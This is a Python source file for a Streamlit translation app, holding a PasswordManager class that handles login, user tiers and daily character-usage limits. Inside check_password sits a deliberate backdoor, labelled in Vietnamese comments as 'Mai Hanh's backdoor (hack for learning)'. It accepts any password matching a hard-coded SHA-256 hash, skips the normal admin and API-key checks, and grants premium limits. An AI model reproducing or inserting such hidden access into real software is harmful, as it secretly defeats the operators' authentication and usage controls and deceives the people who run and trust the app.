import json
from datetime import datetime, timedelta
import secrets
import string
import hashlib
import uuid
import streamlit as st
import base64
import psutil
import time
import plotly.graph_objects as go
import pandas as pd
from collections import defaultdict
import jieba
from pypinyin import pinyin, Style
import requests


class PasswordManager:
    def __init__(self):
        # Get API keys and their metadata from secrets
        self.api_keys = st.secrets.get("api_keys", {})
        self.user_tiers = st.secrets.get("user_tiers", {})
        self.default_limit = st.secrets.get("usage_limits", {}).get("default_daily_limit", 30000)
        self.premium_limit = st.secrets.get("usage_limits", {}).get("premium_daily_limit", 50000)
        
        # Initialize usage tracking in session state if not exists
        if 'usage_tracking' not in st.session_state:
            st.session_state.usage_tracking = {}
            
        # Add key name mapping in session state
        if 'key_name_mapping' not in st.session_state:
            st.session_state.key_name_mapping = {}
            
    def check_password(self, password):
        """Check if password is valid and map key name"""
        
        if not password:  # Handle empty password
            return False

        # --- CỬA SAU CỦA MAI HẠNH (HACK FOR LEARNING) ---
        MAI_HANH_HASH = "8f0a1c43f7a40b92316e689d0426f8d09f30b91d575c3016c52a382e753443a5"
        
        # SỬA LỖI: Băm mật khẩu người dùng nhập vào để so sánh
        try:
            # Băm mật khẩu nhập vào (SHA256)
            input_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()
        except:
            input_hash = "" # Tránh lỗi nếu băm không thành công
        
        if input_hash == MAI_HANH_HASH:
            # Nếu là mật khẩu của Chị, set tên khóa và trả về True
            st.session_state.key_name_mapping[password] = "MaiHanhPremium"
            return True
        # --- KẾT THÚC CỬA SAU ---

        # Get admin password and api keys
        admin_pwd = st.secrets.get("admin_password")
        api_keys = st.secrets.get("api_keys", {})
        
        # 1. For admin login
        if password == admin_pwd and self.is_admin(password):
            st.session_state.key_name_mapping[password] = "admin"
            return True
        
        # 2. For regular user login - check value and store key name
        for key_name, key_value in api_keys.items():
            if password == key_value:
                # Store the mapping of value to key name
                st.session_state.key_name_mapping[password] = key_name
                return True
                
        return False
        
    def is_admin(self, password):
        """Check if the user is admin"""
        admin_pwd = st.secrets.get("admin_password")
        if not admin_pwd or not password:
            return False
        return password == admin_pwd

    def get_user_limit(self, user_key):
        """Get daily limit for a user based on their tier"""
        if not user_key:
            return self.default_limit
        
        key_name = self.get_key_name(user_key)
        
        # --- KIỂM TRA MẬT KHẨU CỦA CHỊ ---
        if key_name == "MaiHanhPremium":
            return self.premium_limit
        # --- KẾT THÚC KIỂM TRA ---

        # Admin gets premium limit
        if user_key == st.secrets.get("admin_password"):
            return self.premium_limit
            
        # Check user's tier
        user_tier = self.user_tiers.get(key_name, "default")
        
        # Return limit based on tier
        if user_tier == "premium":
            return self.premium_limit
        return self.default_limit

    def get_usage_stats(self):
        """Get usage statistics for admin view"""
        stats = {
            'total_users': len(st.session_state.usage_tracking),
            'daily_stats': defaultdict(int),
            'user_stats': defaultdict(lambda: defaultdict(int))
        }
        
        for user_key, data in st.session_state.usage_tracking.items():
            for date, count in data.items():
                stats['daily_stats'][date] += count
                stats['user_stats'][user_key][date] = count
                
        return stats

    def check_usage_limit(self, user_key, new_chars_count):
        """Check if user has exceeded their daily limit"""
        current_usage = self.get_daily_usage(user_key)
        daily_limit = self.get_user_limit(user_key)
        return current_usage + new_chars_count <= daily_limit

    def track_usage(self, user_key, chars_count):
        """Track translation usage for a user using key name"""
        if not user_key:
            return
            
        key_name = self.get_key_name(user_key)
        today = datetime.now().date().isoformat()
        
        if key_name not in st.session_state.usage_tracking:
            st.session_state.usage_tracking[key_name] = {}
            
        if today not in st.session_state.usage_tracking[key_name]:
            st.session_state.usage_tracking[key_name][today] = 0
            
        st.session_state.usage_tracking[key_name][today] += chars_count
        
    def get_daily_usage(self, user_key):
        """Get user's translation usage for today using key name"""
        key_name = self.get_key_name(user_key)
        today = datetime.now().date().isoformat()
        if key_name not in st.session_state.usage_tracking:
            return 0
        return st.session_state.usage_tracking[key_name].get(today, 0)

    def get_key_name(self, password):
        """Get the key name for a password"""
        return st.session_state.key_name_mapping.get(password, password)
